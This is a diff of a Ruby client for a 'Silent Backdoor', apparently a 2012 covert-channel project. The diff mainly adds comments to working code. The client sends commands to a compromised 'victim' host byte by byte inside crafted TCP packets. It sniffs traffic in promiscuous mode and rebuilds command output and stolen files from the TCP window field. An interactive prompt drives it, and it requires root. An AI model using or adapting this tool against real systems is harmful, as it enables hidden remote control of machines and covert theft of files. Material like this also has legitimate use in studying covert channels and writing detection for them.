@@ -1,16 +1,23 @@
 #!/usr/bin/env ruby
 
+# Require files
 require 'rubygems'
 require 'packetfu'
-require 'base64'
 
 # Local files
 curdir = File.dirname(__FILE__);
 require curdir + '/lib_trollop.rb'
 
+#-------------------------------------------------------------------------------
+# Option Parsing using Trollop
+# (http://trollop.rubyforge.org/)
 #
+# Author: Karl Castillo
+# Date: November 20, 2012
 #
-#
+# Notes:
+# Creates the Trollop object necessary for command line argument parsing.
+#-------------------------------------------------------------------------------
 @opts = Trollop::options do
     version "Silent Backdoor Client 1.0 2012(c) Karl Castillo"
     banner <<-EOS
@@ -19,7 +26,7 @@ require curdir + '/lib_trollop.rb'
     ||==     ==     ===  ||  //  ||===     ===     ===    ||==
     ||  || ||  || ||     || //   ||   || ||   || ||   ||  ||  ||
     ||==   ||==|| ||     ||<<    ||   || ||   || ||   ||  ||==
-    ||  || ||  || ||     || \\\\  ||   || ||   || ||   ||  || \\\\
+    ||  || ||  || ||     || \\\\   ||   || ||   || ||   ||  || \\\\
     ||==   ||  ||   ===  ||  \\\\  ||===     ===     ===    ||  \\\\
 
                              v 1.0
@@ -40,11 +47,24 @@ Where [options] are:
     opt :key, "Secret Key", :short => "k", :type => :string, :default => "secretkey" # string --key <s>, default secretkey
 end
 
+#-------------------------------------------------------------------------------
+# wait_cmd_response
+#
+# Author: Karl Castillo
+# Date: November 20, 2012
+#
+# Notes:
+# Creates a PacketFu capture object, and sniffs packets coming from the
+# victim and prints it.
+#-------------------------------------------------------------------------------
 def wait_cmd_response
     cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
                 :promisc => true)
     response = ""
-                
+    
+    #---------------------------------------------------------------------------
+    # Capture Packets
+    #---------------------------------------------------------------------------                
     cap.stream.each do |pkt|
         if PacketFu::TCPPacket.can_parse?(pkt) then
             packet = PacketFu::Packet.parse(pkt)
@@ -52,27 +72,39 @@ def wait_cmd_response
                 if packet.tcp_flags.fin == 1 then
                     puts response
                     return
-                else
+                else # fin
                     if response.nil? then
                         response = packet.tcp_win.chr
-                    elsif
+                    else # nil?
                         response << packet.tcp_win.chr
-                    end # if
-                end # fin
+                    end # nil? else
+                end # fin else
             end # port
         end # can_parse? 
     end # cap
-end
+end # wait_cmd_response
 
+#-------------------------------------------------------------------------------
+# wait_get_response
+#
+# Author: Karl Castillo
+# Date: November 20, 2012
+#
+# Notes:
+# Creates a PacketFu capture object, and sniffs packets coming from the
+# victim and writes it to file.
+#-------------------------------------------------------------------------------
 def wait_get_response(cmd)
     cap = PacketFu::Capture.new(:iface => @opts[:iface], :start => true,
                 :promisc => true)
     cmds = cmd.split(' ')
     filename = cmds[1].split('/').last
-    response = ""
     
     file = File.open(filename, "wb")
     
+    #---------------------------------------------------------------------------
+    # Capture Packets
+    #---------------------------------------------------------------------------
     cap.stream.each do |pkt|
         if PacketFu::TCPPacket.can_parse?(pkt) then
             packet = PacketFu::Packet.parse pkt
@@ -82,14 +114,24 @@ def wait_get_response(cmd)
                     puts "Data written in: " + filename
                     file.close
                     return
-                else
+                else # fin
                     file.putc(packet.tcp_win.chr)
-                end # fin
+                end # fin else
             end # dport
         end # can_parse?
     end # cap
-end
+end # wait_get_response
 
+#-------------------------------------------------------------------------------
+# wait_get_response
+#
+# Author: Karl Castillo
+# Date: November 20, 2012
+#
+# Notes:
+# Creates a PacketFu capture object, and sniffs packets coming from the
+# victim and writes it to file.
+#-------------------------------------------------------------------------------
 def send_command(cmd, code)
     cfg = PacketFu::Utils.whoami?(:iface => @opts[:iface])
     #---------------------------------------------------------------------------
@@ -109,7 +151,7 @@ def send_command(cmd, code)
         
         tcp.recalc
         tcp.to_w(@opts[:iface])
-    end
+    end # each_byte
 
     #---------------------------------------------------------------------------
     # Send FIN packet
@@ -134,17 +176,26 @@ def send_command(cmd, code)
     elsif code == 3 then # Put Command
     
     end 
-end
+end # send_command
 
+#-------------------------------------------------------------------------------
+# prompt
 #
+# Author: Karl Castillo
+# Date: November 20, 2012
 #
-#
+# Notes:
+# Prompts user to enter commands.
+#-------------------------------------------------------------------------------
 def prompt
     while true do
         print "Enter Command > "
         cmd = gets.chomp
         cmds = cmd.split(' ')
         
+        #-----------------------------------------------------------------------
+        # Check which command is entered
+        #-----------------------------------------------------------------------
         if cmds[0] == "quit" or cmds[0] == "q" then # Quit
             abort("Quitting...")
         elsif cmds[0] == "get" or cmds[0] == "g" then # Get File
@@ -157,9 +208,15 @@ def prompt
     end
 end
 
+#-------------------------------------------------------------------------------
+# prompt
 #
+# Author: Karl Castillo
+# Date: November 20, 2012
 #
-#
+# Notes:
+# Starts everything. Checks if user is running root.
+#-------------------------------------------------------------------------------
 begin
     raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
 
